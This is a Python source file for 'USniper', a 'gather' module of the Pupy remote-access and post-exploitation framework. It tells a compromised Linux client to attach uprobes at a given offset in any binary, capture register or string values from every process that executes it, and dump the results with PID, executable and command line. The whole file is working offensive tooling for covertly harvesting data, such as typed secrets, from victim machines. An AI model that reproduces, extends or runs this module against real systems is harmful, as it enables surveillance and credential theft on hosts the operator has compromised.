# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

import sys

from pupy.pupylib.PupyModule import config, PupyModule, PupyArgumentParser

if sys.version_info.major > 2:
    basestring = str

USNIPER_EVENT = 0x13000001

__class_name__ = 'USniper'
__events__ = {
    USNIPER_EVENT: 'usniper'
}


@config(cat='gather', compat=['linux'])
class USniper(PupyModule):
    ''' Globally capture string or register during execution at specified
        physical offset and register using uprobes. Compatible with
        kernels >3.5 (register) and >3.18 (string) '''

    unique_instance = True
    dependencies = {
        'linux': ['usniper']
    }

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='usniper', description=cls.__doc__)
        commands = cls.arg_parser.add_subparsers(help='commands')
        start = commands.add_parser('start', help='Start USniper')
        start.add_argument('-S', '--string', action='store_true',
            default=False, help='Dereference as string (>3.18)')
        start.add_argument('-R', '--ret', action='store_true', default=False,
            help='Get value after return')
        start.add_argument('-C', '--nochar', action='store_true',
            default=False, help='Do not cast register to character')
        start.add_argument('path', help='Absolute path to binary')
        start.add_argument('offset', help='Offset in binary')
        start.add_argument('reg', default='ax', nargs='?',
                               help='Get value from register')
        start.set_defaults(func=cls.start)

        stop = commands.add_parser('stop', help='stop USniper')
        stop.set_defaults(func=cls.stop)

        dump = commands.add_parser('dump', help='dump results')
        dump.set_defaults(func=cls.dump)

    def start(self, args):
        offset = args.offset
        if not offset.lower().startswith('0x'):
            offset = '0x' + offset.upper()
        else:
            offset = '0x' + offset[2:].upper()

        start = self.client.remote('usniper', 'start')

        if start(args.path, offset, args.reg, args.ret,
                 'string' if args.string else None,
                     None if (args.string or args.nochar) else 'chr',
                     event_id=USNIPER_EVENT):
            self.success('Unsipper started')
        else:
            self.error('Usniper start failed')

    def stop(self, args):
        stop = self.client.remote('usniper', 'stop')
        stop()
        self.success('Stop request was sent')

    def dump(self, args):
        dump = self.client.remote('usniper', 'dump')

        data = dump()
        if not data:
            self.warning('No data collected')
            return

        records = []

        for pid, values in data.items():
            for timestamp, dumps in values['dump'].items():
                if all(len(x) == 1 and isinstance(x, basestring) for x in dumps):
                    records.append({
                        'PID': pid,
                        'EXE': values['exe'],
                        'CMD': ' '.join(values['cmd']),
                        'DATA': ''.join(dumps).strip(' \0')
                    })
                else:
                    for dump in dumps:
                        records.append({
                            'PID': pid,
                            'DATA': dump.strip(' \0'),
                            'EXE': values['exe'],
                            'CMD': ' '.join(values['cmd'])
                        })

        self.table(records, ['PID', 'EXE', 'CMD', 'DATA'])

    def run(self, args):
        args.func(self, args)
